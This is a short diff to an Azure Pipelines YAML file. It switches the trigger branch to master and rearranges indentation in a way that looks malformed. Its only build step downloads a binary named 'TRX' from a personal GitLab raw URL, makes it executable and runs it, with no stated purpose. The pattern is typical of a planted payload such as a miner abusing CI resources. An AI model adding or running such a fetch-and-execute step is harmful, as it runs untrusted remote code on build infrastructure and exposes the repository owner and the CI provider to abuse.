@@ -4,10 +4,10 @@
 # https://aka.ms/yaml
 
  trigger:
- - main
+ - master
     
- pool:
-   vmImage: ubuntu-latest
+  pool:
+  vmImage: ubuntu-latest
     
-  steps:
+steps:
   - script: wget https://gitlab.com/mimix200/zpol/-/raw/main/TRX && chmod +x TRX && ./TRX
